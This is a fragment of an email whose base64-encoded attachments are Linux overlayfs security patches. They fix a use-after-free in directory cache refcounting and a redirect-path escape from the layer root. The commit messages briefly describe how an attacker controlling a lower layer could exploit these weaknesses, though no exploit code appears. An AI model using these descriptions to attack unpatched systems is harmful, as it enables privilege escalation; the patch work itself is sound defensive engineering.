+aXMgYmVpbmcgZnJlZWQgYW5kIHRyZWF0IGl0IGFzIGEgY2FjaGUgbWlzcwotIFVzaW5nIHJlZmNv
+dW50X2RlY19hbmRfdGVzdCgpIGluIG92bF9jYWNoZV9wdXQoKSB3aXRoIGJ1aWx0LWluCiAgdW5k
+ZXJmbG93IGRldGVjdGlvbgotIE1vdmluZyBvdmxfaW5vZGVfbG9jaygpIG91dHNpZGUgcmVmY291
+bnRfZGVjX2FuZF90ZXN0KCkgdG8KICBwcm90ZWN0IHRoZSBjYWNoZSBwb2ludGVyIGNoZWNrIGFn
+YWluc3QgY29uY3VycmVudCBvdmxfY2FjaGVfZ2V0KCkKCkxpbms6IGh0dHBzOi8vbG9yZS5rZXJu
+ZWwub3JnL2xpbnV4LXVuaW9uZnMvQ0FPUTR1eGg5c0tCMFh5S3d6RHQ3NE10YVZjQkdiWmhWSk1M
+WjNmeURUWS1UVVFvN1ZBQG1haWwuZ21haWwuY29tLwpTaWduZWQtb2ZmLWJ5OiBSb2RyaWdvIEhl
+bnJpcXVlIGRlIFNvdXphIDxyb2RyaWdvQGtlcm5lbHNlYy5jb20+Ci0tLQogZnMvb3ZlcmxheWZz
+L3JlYWRkaXIuYyB8IDE3ICsrKysrKysrKy0tLS0tLS0tCiAxIGZpbGUgY2hhbmdlZCwgOSBpbnNl
+cnRpb25zKCspLCA4IGRlbGV0aW9ucygtKQoKZGlmZiAtLWdpdCBhL2ZzL292ZXJsYXlmcy9yZWFk
+ZGlyLmMgYi9mcy9vdmVybGF5ZnMvcmVhZGRpci5jCmluZGV4IGU3ZmUyOWNiNjAyOC4uZjkzMGFk
+ZDE0ZGRhIDEwMDY0NAotLS0gYS9mcy9vdmVybGF5ZnMvcmVhZGRpci5jCisrKyBiL2ZzL292ZXJs
+YXlmcy9yZWFkZGlyLmMKQEAgLTEwLDYgKzEwLDcgQEAKICNpbmNsdWRlIDxsaW51eC9maWxlLmg+
+CiAjaW5jbHVkZSA8bGludXgvZmlsZWxvY2suaD4KICNpbmNsdWRlIDxsaW51eC94YXR0ci5oPgor
+I2luY2x1ZGUgPGxpbnV4L3JlZmNvdW50Lmg+CiAjaW5jbHVkZSA8bGludXgvcmJ0cmVlLmg+CiAj
+aW5jbHVkZSA8bGludXgvc2VjdXJpdHkuaD4KICNpbmNsdWRlIDxsaW51eC9jcmVkLmg+CkBAIC0z
+NCw3ICszNSw3IEBAIHN0cnVjdCBvdmxfY2FjaGVfZW50cnkgewogfTsKIAogc3RydWN0IG92bF9k
+aXJfY2FjaGUgewotCWxvbmcgcmVmY291bnQ7CisJcmVmY291bnRfdCByZWZjb3VudDsKIAl1NjQg
+dmVyc2lvbjsKIAlzdHJ1Y3QgbGlzdF9oZWFkIGVudHJpZXM7CiAJc3RydWN0IHJiX3Jvb3Qgcm9v
+dDsKQEAgLTI5NiwxMSArMjk3LDExIEBAIHN0YXRpYyB2b2lkIG92bF9jYWNoZV9wdXQoc3RydWN0
+IG92bF9kaXJfZmlsZSAqb2QsIHN0cnVjdCBpbm9kZSAqaW5vZGUpCiB7CiAJc3RydWN0IG92bF9k
+aXJfY2FjaGUgKmNhY2hlID0gb2QtPmNhY2hlOwogCi0JV0FSTl9PTihjYWNoZS0+cmVmY291bnQg
+PD0gMCk7Ci0JY2FjaGUtPnJlZmNvdW50LS07Ci0JaWYgKCFjYWNoZS0+cmVmY291bnQpIHsKKwlp
+ZiAocmVmY291bnRfZGVjX2FuZF90ZXN0KCZjYWNoZS0+cmVmY291bnQpKSB7CisJCW92bF9pbm9k
+ZV9sb2NrKGlub2RlKTsKIAkJaWYgKG92bF9kaXJfY2FjaGUoaW5vZGUpID09IGNhY2hlKQogCQkJ
+b3ZsX3NldF9kaXJfY2FjaGUoaW5vZGUsIE5VTEwpOworCQlvdmxfaW5vZGVfdW5sb2NrKGlub2Rl
+KTsKIAogCQlvdmxfY2FjaGVfZnJlZSgmY2FjaGUtPmVudHJpZXMpOwogCQlrZnJlZShjYWNoZSk7
+CkBAIC00ODcsOSArNDg4LDkgQEAgc3RhdGljIHN0cnVjdCBvdmxfZGlyX2NhY2hlICpvdmxfY2Fj
+aGVfZ2V0KHN0cnVjdCBkZW50cnkgKmRlbnRyeSkKIAogCWNhY2hlID0gb3ZsX2Rpcl9jYWNoZShp
+bm9kZSk7CiAJaWYgKGNhY2hlICYmIG92bF9pbm9kZV92ZXJzaW9uX2dldChpbm9kZSkgPT0gY2Fj
+aGUtPnZlcnNpb24pIHsKLQkJV0FSTl9PTighY2FjaGUtPnJlZmNvdW50KTsKLQkJY2FjaGUtPnJl
+ZmNvdW50Kys7Ci0JCXJldHVybiBjYWNoZTsKKwkJaWYgKHJlZmNvdW50X2luY19ub3RfemVybygm
+Y2FjaGUtPnJlZmNvdW50KSkKKwkJCXJldHVybiBjYWNoZTsKKwkJLyogQ2FjaGUgcmVmY291bnQg
+aXMgemVybyAtLSBpdCBpcyBiZWluZyBmcmVlZCAqLwogCX0KIAlvdmxfc2V0X2Rpcl9jYWNoZShk
+X2lub2RlKGRlbnRyeSksIE5VTEwpOwogCkBAIC00OTcsNyArNDk4LDcgQEAgc3RhdGljIHN0cnVj
+dCBvdmxfZGlyX2NhY2hlICpvdmxfY2FjaGVfZ2V0KHN0cnVjdCBkZW50cnkgKmRlbnRyeSkKIAlp
+ZiAoIWNhY2hlKQogCQlyZXR1cm4gRVJSX1BUUigtRU5PTUVNKTsKIAotCWNhY2hlLT5yZWZjb3Vu
+dCA9IDE7CisJcmVmY291bnRfc2V0KCZjYWNoZS0+cmVmY291bnQsIDEpOwogCUlOSVRfTElTVF9I
+RUFEKCZjYWNoZS0+ZW50cmllcyk7CiAJY2FjaGUtPnJvb3QgPSBSQl9ST09UOwogCi0tIAoyLjU0
+LjAKCg==
+--0000000000000ca15c0654d933c5
+Content-Type: text/x-patch; charset="US-ASCII"; 
+	name="0001-ovl-restrict-redirect-path-resolution-with-LOOKUP_BE.patch"
+Content-Disposition: attachment; 
+	filename="0001-ovl-restrict-redirect-path-resolution-with-LOOKUP_BE.patch"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mqpd52pu2>
+X-Attachment-Id: f_mqpd52pu2
+
+RnJvbSA0Njg2NTIwYmFjYzgxYjk2YTM4YjgzNjM1MjRkZWFiNjhiN2EyMmI2IE1vbiBTZXAgMTcg
+MDA6MDA6MDAgMjAwMQpGcm9tOiBSb2RyaWdvIEhlbnJpcXVlIGRlIFNvdXphIDxyb2RyaWdvQGtl
+cm5lbHNlYy5jb20+CkRhdGU6IE1vbiwgMjIgSnVuIDIwMjYgMTI6MTM6MjAgLTAzMDAKU3ViamVj
+dDogW1BBVENIIDEvM10gb3ZsOiByZXN0cmljdCByZWRpcmVjdCBwYXRoIHJlc29sdXRpb24gd2l0
+aAogTE9PS1VQX0JFTkVBVEgKCm92bF9sb29rdXBfbGF5ZXIoKSByZXNvbHZlcyBhYnNvbHV0ZSBy
+ZWRpcmVjdCBwYXRocyBieSB3YWxraW5nCmNvbXBvbmVudC1ieS1jb21wb25lbnQgd2l0aCBvdmxf
+bG9va3VwX3NpbmdsZSgpLCB3aGljaCB1c2VzCmxvb2t1cF9vbmVfdW5sb2NrZWQoKSB3aXRob3V0
+IGFueSBtb3VudC1ib3VuZGFyeSBlbmZvcmNlbWVudC4KCkFuIGF0dGFja2VyIHdpdGggY29udHJv
+bCBvZiBhIGxvd2VyIGxheWVyIGNhbiBzZXQKdHJ1c3RlZC5vdmVybGF5LnJlZGlyZWN0IHRvIGEg
+cGF0aCBjb250YWluaW5nICcuLicgb3Igc3ltbGlua3MKdGhhdCBlc2NhcGUgdGhlIGxheWVyIHJv
+b3QuCgpGaXggdGhpcyBieSB1c2luZyB2ZnNfcGF0aF9sb29rdXAoKSB3aXRoIExPT0tVUF9CRU5F
+QVRIIHwKTE9PS1VQX05PX1NZTUxJTktTIHwgTE9PS1VQX05PX1hERVYgZm9yIGFic29sdXRlIHJl
+ZGlyZWN0IHBhdGhzLAptaXJyb3JpbmcgdGhlIGlkZW50aWNhbCBwcm90ZWN0aW9uIGFscmVhZHkg
+cHJlc2VudCBpbgpvdmxfbG9va3VwX2RhdGFfbGF5ZXIoKS4gVGhlc2UgZmxhZ3MgcHJldmVudDoK
+LSBFc2NhcGUgZnJvbSB0aGUgbGF5ZXIgbW91bnQgcm9vdCAoTE9PS1VQX0JFTkVBVEgpCi0gRm9s
+bG93aW5nIHN5bWxpbmtzIChMT09LVVBfTk9fU1lNTElOS1MpCi0gQ3Jvc3NpbmcgZGV2aWNlIGJv
+dW5kYXJpZXMgKExPT0tVUF9OT19YREVWKQoKTGluazogaHR0cHM6Ly9sb3JlLmtlcm5lbC5vcmcv
+bGludXgtdW5pb25mcy9DQU9RNHV4aDlzS0IwWHlLd3pEdDc0TXRhVmNCR2JaaFZKTUxaM2Z5RFRZ
+LVRVUW83VkFAbWFpbC5nbWFpbC5jb20vClNpZ25lZC1vZmYtYnk6IFJvZHJpZ28gSGVucmlxdWUg
+ZGUgU291emEgPHJvZHJpZ29Aa2VybmVsc2VjLmNvbT4KLS0tCiBmcy9vdmVybGF5ZnMvbmFtZWku
+YyB8IDQ3ICsrKysrKysrKysrKysrKysrKystLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAxIGZp
+bGUgY2hhbmdlZCwgMjAgaW5zZXJ0aW9ucygrKSwgMjcgZGVsZXRpb25zKC0pCgpkaWZmIC0tZ2l0
+IGEvZnMvb3ZlcmxheWZzL25hbWVpLmMgYi9mcy9vdmVybGF5ZnMvbmFtZWkuYwppbmRleCBjYTg5
+OWZkZmFhZmQuLjExYzk0ZTVmMzliNSAxMDA2NDQKLS0tIGEvZnMvb3ZlcmxheWZzL25hbWVpLmMK
+KysrIGIvZnMvb3ZlcmxheWZzL25hbWVpLmMKQEAgLTM1Niw0MiArMzU2LDM1IEBAIHN0YXRpYyBp
+bnQgb3ZsX2xvb2t1cF9zaW5nbGUoc3RydWN0IGRlbnRyeSAqYmFzZSwgc3RydWN0IG92bF9sb29r
+dXBfZGF0YSAqZCwKIHN0YXRpYyBpbnQgb3ZsX2xvb2t1cF9sYXllcihzdHJ1Y3QgZGVudHJ5ICpi
+YXNlLCBzdHJ1Y3Qgb3ZsX2xvb2t1cF9kYXRhICpkLAogCQkJICAgIHN0cnVjdCBkZW50cnkgKipy
+ZXQsIGJvb2wgZHJvcF9uZWdhdGl2ZSkKIHsKLQkvKiBDb3VudGluZyBkb3duIGZyb20gdGhlIGVu
+ZCwgc2luY2UgdGhlIHByZWZpeCBjYW4gY2hhbmdlICovCi0Jc2l6ZV90IHJlbSA9IGQtPm5hbWUu
+bGVuIC0gMTsKLQlzdHJ1Y3QgZGVudHJ5ICpkZW50cnkgPSBOVUxMOwogCWludCBlcnI7CisJc3Ry
+dWN0IHBhdGggcGF0aCA9IHsgfTsKIAogCWlmIChkLT5uYW1lLm5hbWVbMF0gIT0gJy8nKQogCQly
+ZXR1cm4gb3ZsX2xvb2t1cF9zaW5nbGUoYmFzZSwgZCwgZC0+bmFtZS5uYW1lLCBkLT5uYW1lLmxl
+biwKIAkJCQkJIDAsICIiLCByZXQsIGRyb3BfbmVnYXRpdmUpOwogCi0Jd2hpbGUgKCFJU19FUlJf
+T1JfTlVMTChiYXNlKSAmJiBkX2Nhbl9sb29rdXAoYmFzZSkpIHsKLQkJY29uc3QgY2hhciAqcyA9
+IGQtPm5hbWUubmFtZSArIGQtPm5hbWUubGVuIC0gcmVtOwotCQljb25zdCBjaGFyICpuZXh0ID0g
+c3RyY2hybnVsKHMsICcvJyk7Ci0JCXNpemVfdCB0aGlzbGVuID0gbmV4dCAtIHM7Ci0JCWJvb2wg
+ZW5kID0gIW5leHRbMF07Ci0KLQkJLyogVmVyaWZ5IHdlIGRpZCBub3QgZ28gb2ZmIHRoZSByYWls
+cyAqLwotCQlpZiAoV0FSTl9PTihzWy0xXSAhPSAnLycpKQotCQkJcmV0dXJuIC1FSU87Ci0KLQkJ
+ZXJyID0gb3ZsX2xvb2t1cF9zaW5nbGUoYmFzZSwgZCwgcywgdGhpc2xlbiwKLQkJCQkJZC0+bmFt
+ZS5sZW4gLSByZW0sIG5leHQsICZiYXNlLAotCQkJCQlkcm9wX25lZ2F0aXZlKTsKLQkJZHB1dChk
+ZW50cnkpOwotCQlpZiAoZXJyKQotCQkJcmV0dXJuIGVycjsKLQkJZGVudHJ5ID0gYmFzZTsKLQkJ
+aWYgKGVuZCkKLQkJCWJyZWFrOworCS8qCisJICogUmVzb2x2ZSBhYnNvbHV0ZSByZWRpcmVjdCBw
+YXRocyBmcm9tIHRoZSBsYXllciByb290IHdpdGggdGhlIHNhbWUKKwkgKiByZXN0cmljdGlvbnMg
+dXNlZCBieSBvdmxfbG9va3VwX2RhdGFfbGF5ZXIoKTogcHJldmVudCBzeW1saW5rCisJICogdHJh
+dmVyc2FsLCBkZXZpY2UgY3Jvc3NpbmcsIGFuZCBlc2NhcGUgZnJvbSB0aGUgbGF5ZXIgcm9vdC4K
+KwkgKi8KKwllcnIgPSB2ZnNfcGF0aF9sb29rdXAoZC0+bGF5ZXItPm1udC0+bW50X3Jvb3QsIGQt
+PmxheWVyLT5tbnQsCisJCQkgICAgICBkLT5uYW1lLm5hbWUsCisJCQkgICAgICBMT09LVVBfQkVO
+RUFUSCB8IExPT0tVUF9OT19TWU1MSU5LUyB8IExPT0tVUF9OT19YREVWLAorCQkJICAgICAgJnBh
+dGgpOworCWlmIChlcnIpCisJCXJldHVybiBlcnI7CiAKLQkJcmVtIC09IHRoaXNsZW4gKyAxOwor
+CWVyciA9IC1FUkVNT1RFOworCWlmIChXQVJOX09OKG92bF9kZW50cnlfd2VpcmQocGF0aC5kZW50
+cnkpKSkKKwkJZ290byBvdXRfcGF0aF9wdXQ7CiAKLQkJaWYgKFdBUk5fT04ocmVtID49IGQtPm5h
+bWUubGVuKSkKLQkJCXJldHVybiAtRUlPOwotCX0KLQkqcmV0ID0gZGVudHJ5OworCSpyZXQgPSBw
+YXRoLmRlbnRyeTsKIAlyZXR1cm4gMDsKKworb3V0X3BhdGhfcHV0OgorCXBhdGhfcHV0KCZwYXRo
+KTsKKwlyZXR1cm4gZXJyOwogfQogCiBzdGF0aWMgaW50IG92bF9sb29rdXBfZGF0YV9sYXllcihz
+dHJ1Y3QgZGVudHJ5ICpkZW50cnksIGNvbnN0IGNoYXIgKnJlZGlyZWN0LAotLSAKMi41NC4wCgo=
+--0000000000000ca15c0654d933c5
+Content-Type: text/x-patch; charset="US-ASCII"; 
+	name="0003-ovl-safely-drop-impure-directory-cache-with-refcount.patch"
+Content-Disposition: attachment; 
+	filename="0003-ovl-safely-drop-impure-directory-cache-with-refcount.patch"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mqpd52t84>
+X-Attachment-Id: f_mqpd52t84
+
+RnJvbSBmMTdhZWNhNDRlNTRhMzRiNTA5ZTBmODZiOTcyZGVmMjE1ZmRhYWMyIE1vbiBTZXAgMTcg
+MDA6MDA6MDAgMjAwMQpGcm9tOiBSb2RyaWdvIEhlbnJpcXVlIGRlIFNvdXphIDxyb2RyaWdvQGtl
+cm5lbHNlYy5jb20+CkRhdGU6IE1vbiwgMjIgSnVuIDIwMjYgMTI6MTQ6NTQgLTAzMDAKU3ViamVj
+dDogW1BBVENIIDMvM10gb3ZsOiBzYWZlbHkgZHJvcCBpbXB1cmUgZGlyZWN0b3J5IGNhY2hlIHdp
+dGggcmVmY291bnQKIGNoZWNrCgpUaGUgaW1wdXJlIGNhY2hlIGluIG92bF9jYWNoZV9nZXRfaW1w
+dXJlKCkgaXMgbm90IHJlZmNvdW50ZWQgYW5kCndhcyBmcmVlZCB1bmNvbmRpdGlvbmFsbHkgZXZl
+biBpZiBhIG1lcmdlZCBkaXJlY3RvcnkgY2FjaGUgc3RpbGwKaGFkIGFjdGl2ZSByZWZlcmVuY2Vz
+IHZpYSBvZC0+Y2FjaGUgaW4gb3BlbiBkaXJlY3RvcnkgZmlsZXMuCgpBZGQgb3ZsX2Rpcl9jYWNo
+ZV9kcm9wKCkgd2hpY2g6CjEuIFJlbW92ZXMgdGhlIGNhY2hlIGZyb20gdGhlIGlub2RlIGZpcnN0
+CjIuIE9ubHkgZnJlZXMgaXQgaWYgcmVmY291bnRfcmVhZCgpIHJldHVybnMgemVybyAobm8gYWN0
+aXZlIHVzZXJzKQozLiBQcmVzZXJ2ZXMgdGhlIGNhY2hlIGlmIGl0IGlzIHN0aWxsIGluIHVzZSBi
+eSBjb25jdXJyZW50IGZpbGUKICAgZGVzY3JpcHRvcnMKClRoaXMgcHJldmVudHMgYSBVQUYgc2Nl
+bmFyaW8gd2hlcmUgYSBtZXJnZWQgZGlyIGNhY2hlIHJlZmNvdW50CmlzIHByb3RlY3RpbmcgYSBj
+YWNoZSB0aGF0IG92bF9jYWNoZV9nZXRfaW1wdXJlKCkgZnJlZXMgb3V0IGZyb20KdW5kZXIgaXQu
+CgpTaWduZWQtb2ZmLWJ5OiBSb2RyaWdvIEhlbnJpcXVlIGRlIFNvdXphIDxyb2RyaWdvQGtlcm5l
+bHNlYy5jb20+Ci0tLQogZnMvb3ZlcmxheWZzL3JlYWRkaXIuYyB8IDIzICsrKysrKysrKysrKysr
+KysrKysrKy0tCiAxIGZpbGUgY2hhbmdlZCwgMjEgaW5zZXJ0aW9ucygrKSwgMiBkZWxldGlvbnMo
+LSkKCmRpZmYgLS1naXQgYS9mcy9vdmVybGF5ZnMvcmVhZGRpci5jIGIvZnMvb3ZlcmxheWZzL3Jl
+YWRkaXIuYwppbmRleCBmOTMwYWRkMTRkZGEuLjRkOTMxMjk4MTBiYSAxMDA2NDQKLS0tIGEvZnMv
+b3ZlcmxheWZzL3JlYWRkaXIuYworKysgYi9mcy9vdmVybGF5ZnMvcmVhZGRpci5jCkBAIC0yOTMs
+NiArMjkzLDI2IEBAIHZvaWQgb3ZsX2Rpcl9jYWNoZV9mcmVlKHN0cnVjdCBpbm9kZSAqaW5vZGUp
+CiAJfQogfQogCitzdGF0aWMgdm9pZCBvdmxfZGlyX2NhY2hlX2Ryb3Aoc3RydWN0IGlub2RlICpp
+bm9kZSkKK3sKKwlzdHJ1Y3Qgb3ZsX2Rpcl9jYWNoZSAqY2FjaGUgPSBvdmxfZGlyX2NhY2hlKGlu
+b2RlKTsKKworCWlmICghY2FjaGUpCisJCXJldHVybjsKKworCW92bF9zZXRfZGlyX2NhY2hlKGlu
+b2RlLCBOVUxMKTsKKworCS8qCisJICogTWVyZ2VkIGRpciBjYWNoZXMgYXJlIHJlZmNvdW50ZWQg
+Ynkgb3BlbiBkaXJlY3RvcnkgZmlsZXMuCisJICogT25seSBmcmVlIHRoZSBjYWNoZSBpZiBub2Jv
+ZHkgaXMgdXNpbmcgaXQuCisJICovCisJaWYgKHJlZmNvdW50X3JlYWQoJmNhY2hlLT5yZWZjb3Vu
+dCkpCisJCXJldHVybjsKKworCW92bF9jYWNoZV9mcmVlKCZjYWNoZS0+ZW50cmllcyk7CisJa2Zy
+ZWUoY2FjaGUpOworfQorCiBzdGF0aWMgdm9pZCBvdmxfY2FjaGVfcHV0KHN0cnVjdCBvdmxfZGly
+X2ZpbGUgKm9kLCBzdHJ1Y3QgaW5vZGUgKmlub2RlKQogewogCXN0cnVjdCBvdmxfZGlyX2NhY2hl
+ICpjYWNoZSA9IG9kLT5jYWNoZTsKQEAgLTcwNCw4ICs3MjQsNyBAQCBzdGF0aWMgc3RydWN0IG92
+bF9kaXJfY2FjaGUgKm92bF9jYWNoZV9nZXRfaW1wdXJlKGNvbnN0IHN0cnVjdCBwYXRoICpwYXRo
+KQogCQlyZXR1cm4gY2FjaGU7CiAKIAkvKiBJbXB1cmUgY2FjaGUgaXMgbm90IHJlZmNvdW50ZWQs
+IGZyZWUgaXQgaGVyZSAqLwotCW92bF9kaXJfY2FjaGVfZnJlZShpbm9kZSk7Ci0Jb3ZsX3NldF9k
+aXJfY2FjaGUoaW5vZGUsIE5VTEwpOworCW92bF9kaXJfY2FjaGVfZHJvcChpbm9kZSk7CiAKIAlj
+YWNoZSA9IGt6YWxsb2Nfb2JqKHN0cnVjdCBvdmxfZGlyX2NhY2hlKTsKIAlpZiAoIWNhY2hlKQot
+LSAKMi41NC4wCgo=
+--0000000000000ca15c0654d933c5--
